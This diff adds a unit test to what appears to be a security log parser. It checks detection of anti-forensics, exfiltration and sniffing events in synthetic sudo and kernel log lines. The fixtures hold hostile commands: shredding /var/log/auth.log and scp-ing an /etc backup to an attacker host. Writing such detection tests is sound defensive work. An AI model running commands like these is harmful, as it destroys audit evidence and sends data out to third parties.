@@ -206,3 +206,24 @@ def test_parse_critical_file_tamper_log(parser):
     assert "authorized_keys" in ev_tamper.details["target_file"]
 
 
+def test_parse_defense_apt_anti_forensics_exfil_and_rootkit(parser):
+    line_af = "Nov 07 16:08:00 fenn sudo[6200]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log"
+    ev_af = parser.parse_line(line_af)
+    assert ev_af is not None
+    assert ev_af.event_type == "anti_forensics_execution"
+    assert ev_af.details["technique"] == "T1070"
+
+    line_exf = "Nov 07 16:09:00 fenn sudo[6205]:   ubuntu : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/scp /tmp/etc_backup.tar.gz attacker@198.51.100.77:/tmp/"
+    ev_exf = parser.parse_line(line_exf)
+    assert ev_exf is not None
+    assert ev_exf.event_type == "data_exfiltration_attempt"
+    assert ev_exf.source_ip == "198.51.100.77"
+
+    line_rk = "Nov 07 16:10:00 fenn kernel: device eth0 entered promiscuous mode"
+    ev_rk = parser.parse_line(line_rk)
+    assert ev_rk is not None
+    assert ev_rk.event_type == "rootkit_or_sniff_activity"
+    assert ev_rk.details["interface"] == "eth0"
+
+
+
